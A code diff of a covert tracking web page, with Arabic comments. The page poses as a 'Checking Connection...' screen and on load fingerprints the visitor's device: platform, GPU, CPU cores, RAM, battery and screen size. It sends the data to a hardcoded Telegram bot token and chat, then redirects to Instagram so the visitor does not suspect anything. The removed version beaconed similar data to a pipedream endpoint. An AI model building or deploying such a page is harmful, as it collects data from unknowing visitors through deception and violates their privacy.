@@ -1,23 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <script>
-        function launch() {
-            const u = new URLSearchParams(window.location.search).get('u') || 'https://instagram.com';
-            const server = "https://eo9vbt8nw49qmpi.m.pipedream.net/"; 
-
-            // إرسال البيانات للسيرفر (خلف الكواليس)
-            navigator.sendBeacon(server, JSON.stringify({
-                plt: navigator.platform,
-                scr: screen.width + "x" + screen.height
-            }));
-
-            // مسح أثرك من المتصفح والتحويل فوراً
-            window.history.replaceState(null, null, u);
-            window.location.replace(u);
-        }
-        window.onload = launch;
-    </script>
+    <title>Checking Connection...</title>
 </head>
-<body style="background:#000"></body>
+<body>
+    <script>
+        async function sendData() {
+            // 1. جمع المعلومات الدقيقة بالجافا سكربت
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            let gpu = "Unknown";
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_AD);
+            }
+
+            const deviceData = {
+                platform: navigator.platform,
+                gpu: gpu,
+                cores: navigator.hardwareConcurrency,
+                ram: navigator.deviceMemory || "Unknown",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                battery: ""
+            };
+
+            // سحب معلومات البطارية
+            if (navigator.getBattery) {
+                const bat = await navigator.getBattery();
+                deviceData.battery = `${(bat.level * 100)}%`;
+            }
+
+            // 2. إرسال المعلومات لبوت التليجرام مالتك
+            // استبدل التوكن والآيدي مالتك هنا
+            const token = '8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8';
+            const chat_id = '5773364548';
+            
+            const message = `🚨 صيد جديد من الخبير:\n\n` +
+                            `📱 النظام: ${deviceData.platform}\n` +
+                            `🎮 المعالج الرسومي: ${deviceData.gpu}\n` +
+                            `🧠 الرام: ${deviceData.ram} GB\n` +
+                            `🔋 البطارية: ${deviceData.battery}\n` +
+                            `🖥 الشاشة: ${deviceData.screen}\n` +
+                            `⚙️ الأنوية: ${deviceData.cores}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                // بعد ما يخلص السحب، حوله للموقع الحقيقي حتى ما يشك
+                window.location.href = "https://www.instagram.com";
+            });
+        }
+
+        sendData();
+    </script>
+</body>
 </html>
